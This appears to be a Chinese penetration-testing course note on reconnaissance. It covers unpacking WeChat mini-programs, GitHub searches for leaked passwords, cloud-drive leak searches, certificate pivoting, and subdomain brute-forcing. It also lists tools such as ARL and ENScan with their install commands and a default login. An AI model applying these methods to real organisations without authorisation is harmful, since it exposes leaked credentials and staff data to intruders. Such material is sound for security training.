<p><a href="../%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/4%E3%80%81APK%E5%B0%8F%E7%A8%8B%E5%BA%8F%E9%80%86%E5%90%91%E7%A0%B4%E5%A3%B3.md">APP程序逆向</a></p>
<p>小程序多功能助手</p>
<p><a href="https://xcx.siqingw.top/">小程序多功能助手</a></p>
<p>操作流程</p>
<ul>
<li>扎到Wechat文件存储的目录</li>
<li>清空wxapkg缓存文件</li>
<li>运行目标小程序生成新包</li>
<li>使用工具选择_APP_.wxapkg文件</li>
<li>先执行解包再反编译（新版&#x2F;旧版根据小程序版本选择）</li>
<li>通过微信开发者工具导入反编译后的源码</li>
</ul>
<h1 id="查缺补漏"><a href="#查缺补漏" class="headerlink" title="查缺补漏"></a>查缺补漏</h1><h2 id="公众号信息收集"><a href="#公众号信息收集" class="headerlink" title="公众号信息收集"></a>公众号信息收集</h2><h3 id="获取公众号"><a href="#获取公众号" class="headerlink" title="获取公众号"></a>获取公众号</h3><p>1、爱企查查询</p>
<ul>
<li>查询方法：在爱企查平台搜索企业名称，查看”知识产权”和”网站备案”栏目</li>
<li>关键信息：部分企业会在知识产权中泄露微信公众号信息，如成都生动网络科技有限公司案例</li>
<li>注意事项：显示微信号为零不代表真实没有，可能是收益手段</li>
</ul>
<p>2、搜狗微信</p>
<ul>
<li>搜索技巧：<ul>
<li>直接搜索企业全称（如”成都生动网络科技有限公司”）</li>
<li>若无结果可尝试去掉部分关键词或使用简称</li>
<li>可通过”搜文章”功能查找相关交互内容</li>
</ul>
</li>
<li>验证方法：搜索结果需人工判断是否为目标公众号</li>
</ul>
<h2 id="GitHub信息收集"><a href="#GitHub信息收集" class="headerlink" title="GitHub信息收集"></a>GitHub信息收集</h2><h3 id="收集方式"><a href="#收集方式" class="headerlink" title="收集方式"></a>收集方式</h3><h4 id="思路一"><a href="#思路一" class="headerlink" title="思路一"></a>思路一</h4><p>​	查询源码泄露信息或数据泄露信息</p>
<p>基础语法：</p>
<ul>
<li>in:name test：仓库标题搜索</li>
<li>in:description test：仓库描述搜索</li>
<li>stars:&gt;3000 test：stars数量过滤</li>
</ul>
<p>高级技巧：组合使用password in:file等语法可发现敏感信息</p>
<p>eg.1</p>
<blockquote>
<p>x-bull.com password in:file</p>
</blockquote>
<p>通过结果进行人工检查泄露信息与目标的关联性</p>
<p>其他语句</p>
<blockquote>
<ul>
<li>库标题搜索：使用in:name test可搜索仓库标题含关键字的项目</li>
<li>描述搜索：in:description test可搜索仓库描述含关键字的项目</li>
<li>Readme搜索：in:readme test可搜索Readme文件含关键字的项目</li>
<li>星标筛选：<ul>
<li>stars:&gt;3000 test筛选星标大于3000的项目</li>
<li>stars:1000..3000 test筛选星标在1000-3000之间的项目</li>
</ul>
</li>
<li>分支筛选：<ul>
<li>forks:&gt;1000 test筛选分支数大于1000的项目</li>
<li>forks:1000..8000 test筛选分支数在1000-8000之间的项目</li>
</ul>
</li>
</ul>
</blockquote>
<h4 id="思路二"><a href="#思路二" class="headerlink" title="思路二"></a>思路二</h4><p>收集人员和邮箱信息</p>
<ul>
<li>域名搜索：基于目标网站域名进行信息收集，如搜索”edu.cn”等教育机构域名</li>
<li>人员信息搜索：通过开发人员姓名、邮箱等个人信息进行检索，适用于查找个人相关的代码提交</li>
<li>混合搜索：可同时使用”域名+邮箱”等组合条件提高搜索精准度</li>
</ul>
<h3 id="Github监控"><a href="#Github监控" class="headerlink" title="Github监控"></a>Github监控</h3><p>通过监控github检测是否有源代码泄露</p>
<p>工具推荐</p>
<ul>
<li><a href="https://github.com/NHPT/FireEyeGoldCrystal">NHPT&#x2F;FireEyeGoldCrystal: 一个GitHub监控和信息收集工具，支持监控和收集CVE、免杀、漏洞利用等内置关键字和自定义关键字。</a></li>
<li><a href="https://github.com/VKSRC/Github-Monitor">VKSRC&#x2F;Github-Monitor: Github Sensitive Information Leakage Monitor(Github信息泄漏监控系统)</a></li>
<li><a href="https://github.com/madneal/gshark">madneal&#x2F;gshark: Scan for sensitive information easily and effectively.</a></li>
</ul>
<p><strong>确保与GitHub的稳定连接</strong></p>
<h2 id="网盘信息收集"><a href="#网盘信息收集" class="headerlink" title="网盘信息收集"></a>网盘信息收集</h2><p>主要收集</p>
<p>​	存储企业招标人员信息、业务产品和业务员资料等各类文件（包括但不限于网站源码、公司Excel表格、企业招标信息、企业介绍文档等）</p>
<p>搜索方式：</p>
<ul>
<li>盘搜搜：<a href="https://pansoso.com/">网盘搜索,就上盘搜搜 - 好用的百度云搜索引擎</a></li>
<li>盘多多：<a href="http://www.panduoduo.net/">http://www.panduoduo.net</a></li>
<li>大力盘：<a href="https://dalipan.com/">https://dalipan.com</a></li>
</ul>
<p>软件推荐：</p>
<p><a href="https://hunhepan.com/">混合盘 - 自定义规则类APP - 可搜索全网网盘、磁力资源</a></p>
<p><strong>通常作为辅助手段</strong></p>
<h2 id="证书搜索"><a href="#证书搜索" class="headerlink" title="证书搜索"></a>证书搜索</h2><ul>
<li>核心原理：通过SSL&#x2F;TLS证书关联资产</li>
<li>操作方法：<ul>
<li>获取目标网站证书</li>
<li>提取证书域名信息</li>
<li>使用特定语法搜索（如cert:）</li>
</ul>
</li>
<li>支持平台：Fofa、Quake等网络空间搜索引擎</li>
</ul>
<h2 id="暴力破解"><a href="#暴力破解" class="headerlink" title="暴力破解"></a>暴力破解</h2><p>通过枚举的方式，爆破目录信息或者子域名信息</p>
<ul>
<li>OneForAll：<a href="https://github.com/shmilylty/OneForAll">https://github.com/shmilylty/OneForAll</a></li>
<li>ksudbomain：<a href="https://github.com/knownsec/ksubdomain">https://github.com/knownsec/ksubdomain</a></li>
<li>subDomainsBrute：<a href="https://github.com/lijiejie/subDomainsBrute">https://github.com/lijiejie/subDomainsBrute</a></li>
<li>Sublist3r:  <a href="https://github.com/aboul3la/Sublist3r">https://github.com/aboul3la/Sublist3r</a></li>
<li>子域名挖掘机：<a href="https://github.com/euphrat1ca/LayerDomainFinder">https://github.com/euphrat1ca/LayerDomainFinder</a></li>
<li>dirsearch：<a href="https://github.com/maurosoria/dirsearch">https://github.com/maurosoria/dirsearch</a></li>
</ul>
<h1 id="自动化工具推荐"><a href="#自动化工具推荐" class="headerlink" title="自动化工具推荐"></a>自动化工具推荐</h1><h2 id="F8X自动化部署工具"><a href="#F8X自动化部署工具" class="headerlink" title="F8X自动化部署工具"></a>F8X自动化部署工具</h2><p>项目地址</p>
<p>​	<a href="https://github.com/ffffffff0x/f8x">ffffffff0x&#x2F;f8x: 红&#x2F;蓝队环境自动化部署工具 | Red&#x2F;Blue team environment automation deployment tool</a></p>
<p>项目概述</p>
<p>​	f8x是一款红蓝队环境自动化部署工具，支持多种场景的渗透测试、开发和代理环境搭建。</p>
<p>功能特色：</p>
<ul>
<li>支持一键部署ARL、MobSF等常见安全工具环境</li>
<li>可自动安装CobaltStrike、Metasploit等红队工具</li>
<li>支持Docker环境快速部署</li>
</ul>
<p>使用方法：</p>
<blockquote>
<ul>
<li>wget : <code>wget -O f8x https://raw.githubusercontent.com/ffffffff0x/f8x/main/f8x</code></li>
<li>curl : <code>curl -o f8x https://raw.githubusercontent.com/ffffffff0x/f8x/main/f8x</code></li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">bash f8x -h</span><br></pre></td></tr></table></figure>



<p><img src="https://github.com/ffffffff0x/f8x/raw/main/assets/img/1.png" alt="img"></p>
</blockquote>
<h2 id="AsamF综合资产测绘工具"><a href="#AsamF综合资产测绘工具" class="headerlink" title="AsamF综合资产测绘工具"></a>AsamF综合资产测绘工具</h2><p>项目地址</p>
<p>​	<a href="https://github.com/Kento-Sec/AsamF">Kento-Sec&#x2F;AsamF: AsamF是集成Fofa、Quake、Hunter、Shodan、Zoomeye、Chinaz、0.zone及爱企查的一站式企业信息资产收集、网络资产测绘工具。</a></p>
<p>项目概述</p>
<p>​	AsamF集成了Fofa、Hunter、Quake、Zoomeye、Shodan、爱企查、Chinaz、0.zone、subfinder。AsamF支持Fofa、Hunter、Quake、Zoomeye、Shodan、Chinaz、0.zone配置多个Key，在搜索前加入对应选择key的flag可以自由切换需要使用的key。可以通过info命令来查看该key的账户信息。Union命令将联合Fofa、Hunter、Quake、Zoomeye内置的语法格式进行搜索。所有的命令、子命令都支持短命令使用。</p>
<p>使用方法</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">AsamF_windows_amd64.exe -h </span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">在~/.config/asamf/生成的config.json文件进行配置</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">自动结果保存在~/asamf/目录下。</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">常用参数：</span><br><span class="line">NAME:</span><br><span class="line">   AsamF - 一站式资产收集处理工具</span><br><span class="line"></span><br><span class="line">USAGE:</span><br><span class="line">   AsamF_windows_amd64.exe [global options] command [command options] [arguments...]</span><br><span class="line"></span><br><span class="line">VERSION:</span><br><span class="line">   0.2.5</span><br><span class="line"></span><br><span class="line">COMMANDS:</span><br><span class="line">   fofa, f     使用Fofa搜索。</span><br><span class="line">   zoomeye, z  使用Zoomeye搜索。</span><br><span class="line">   hunter, h   使用Hunter搜索。</span><br><span class="line">   quake, q    使用Quake搜索。</span><br><span class="line">   shodan, s   使用Shodan搜索。</span><br><span class="line">   cn          使用cn命令搜索公司信息。</span><br><span class="line">   0zone, 0    使用Ozone搜索.</span><br><span class="line">   myip        查看您的IP。</span><br><span class="line">   vuln, v     搜索漏洞功能。不添加-q参数将搜索最新的30个漏洞信息。</span><br><span class="line">   help, h     Shows a list of commands or help for one command</span><br><span class="line"></span><br><span class="line">GLOBAL OPTIONS:</span><br><span class="line">   --help, -h     show help</span><br><span class="line">   --version, -v  print the version</span><br></pre></td></tr></table></figure>







<h2 id="ENScan-Go-企业信息收集工具"><a href="#ENScan-Go-企业信息收集工具" class="headerlink" title="ENScan Go 企业信息收集工具"></a>ENScan Go 企业信息收集工具</h2><p>项目地址：<a href="https://github.com/wgpsec/ENScan_GO">wgpsec&#x2F;ENScan_GO: 一款基于各大企业信息API的工具，解决在遇到的各种针对国内企业信息收集难题。一键收集控股公司ICP备案、APP、小程序、微信公众号等信息聚合导出。支持MCP接入</a></p>
<p><img src="/img/xiaodi/ENScanGo.png" alt="ENScanGo"></p>
<p>使用方法</p>
<blockquote>
<p>1、初次使用生成配置文件</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">./enscan -v</span><br></pre></td></tr></table></figure>

<p>2、使用参数</p>
<p>Usage of enscan-v1.2.1-windows-amd64.exe:<br>  -api<br>        API模式运行<br>  -branch<br>        查询分支机构（分公司）信息<br>  -branch-filter string<br>        提供一个正则表达式，名称匹配该正则的分支机构和子公司会被跳过<br>  -debug<br>        是否显示debug详细信息<br>  -deep int<br>        递归搜索n层公司 (default 1)<br>  -delay int<br>        每个请求延迟（S）-1为随机延迟1-5S<br>  -f string<br>        批量查询，文本按行分隔<br>  -field string<br>        获取字段信息 eg icp<br>  -hold<br>        是否查询控股公司<br>  -i string<br>        公司PID<br>  -invest float<br>        投资比例 eg 100<br>  -is-branch<br>        深度查询分支机构信息（数量巨大）<br>  -is-group<br>        查询关键词为集团<br>  -is-pid<br>        批量查询文件是否为公司PID<br>  -is-show<br>        是否展示信息输出 (default true)<br>  -json<br>        json导出<br>  -mcp<br>        MCP模式运行<br>  -n string<br>        关键词 eg 小米<br>  -no-merge<br>        开启后查询文件将单独导出<br>  -out-dir string<br>        结果输出的文件夹位置(默认为outs)<br>  -out-type string<br>        导出的文件后缀 默认xlsx (default “xlsx”)<br>  -out-update string<br>        导出指定范围文件，自更新<br>  -proxy string<br>        设置代理<br>  -supplier<br>        是否查询供应商信息<br>  -timeout int<br>        每个请求默认1（分钟）超时 (default 1)<br>  -type string<br>        查询渠道，可多选 (default “aqc”)<br>  -v    版本信息</p>
</blockquote>
<h2 id="ARL灯塔"><a href="#ARL灯塔" class="headerlink" title="ARL灯塔"></a>ARL灯塔</h2><p>项目地址</p>
<p><a href="https://github.com/Aabyss-Team/ARL">Aabyss-Team&#x2F;ARL: ARL官方仓库备份项目：ARL(Asset Reconnaissance Lighthouse)资产侦察灯塔系统旨在快速侦察与目标关联的互联网资产，构建基础资产信息库。 协助甲方安全团队或者渗透测试人员有效侦察和检索资产，发现存在的薄弱点和攻击面。</a></p>
<p>使用方法</p>
<blockquote>
<p>1、安装</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">国外</span></span><br><span class="line">wget https://raw.githubusercontent.com/Aabyss-Team/ARL/master/misc/setup-arl.sh</span><br><span class="line">chmod +x setup-arl.sh</span><br><span class="line">./setup-arl.sh</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">国内</span></span><br><span class="line">wget https://raw.gitcode.com/msmoshang/ARL/blobs/24b06ec7efb32b9be380ab01ebf505e77c7811bf/setup-arl.sh</span><br><span class="line">chmod +x setup-arl.sh</span><br><span class="line">./setup-arl.sh</span><br></pre></td></tr></table></figure>

<p>2、访问web页面</p>
<p>源码安装后，请前往ARL-Web页面：<code>https://IP:5003/</code></p>
<p>原账号密码：<code>admin</code>,<code>arlpass</code></p>
<p>新版账号密码为随机生成，会打印在控制台</p>
</blockquote>
<h2 id="Nemo-信息收集平台"><a href="#Nemo-信息收集平台" class="headerlink" title="Nemo 信息收集平台"></a>Nemo 信息收集平台</h2><p>项目地址</p>
<p>​	<a href="https://github.com/hanc00l/nemo_go?tab=readme-ov-file">hanc00l&#x2F;nemo_go: Nemo是用来进行自动化信息收集的一个简单平台，通过集成常用的信息收集工具和技术，实现对内网及互联网资产信息的自动收集，提高隐患排查和渗透测试的工作效率。</a></p>
<p>安装方法</p>
<p>​	<a href="https://github.com/hanc00l/nemo_go/blob/main/v3/docs/install.md">https://github.com/hanc00l/nemo_go/blob/main/v3/docs/install.md</a></p>
<p>使用方法</p>
<p>​	<a href="https://github.com/hanc00l/nemo_go/blob/main/v3/docs/quickstart.md">https://github.com/hanc00l/nemo_go/blob/main/v3/docs/quickstart.md</a></p>
<h2 id="All-Defense-Tool武器库"><a href="#All-Defense-Tool武器库" class="headerlink" title="All-Defense-Tool武器库"></a>All-Defense-Tool武器库</h2><p>项目地址：</p>
<p><a href="https://github.com/guchangan1/All-Defense-Tool">guchangan1&#x2F;All-Defense-Tool: 本项目集成了全网优秀的攻防武器工具项目，包含自动化利用，子域名、目录扫描、端口扫描等信息收集工具，各大中间件、cms、OA漏洞利用工具，爆破工具、内网横向、免杀、社工钓鱼以及应急响应、甲方安全资料等其他安全攻防资料。</a></p>
]]></content>
      <categories>
        <category>网络安全</category>
        <category>小迪安全</category>
      </categories>
      <tags>
        <tag>网络安全</tag>
        <tag>小迪安全</tag>
      </tags>
  </entry>
</search>
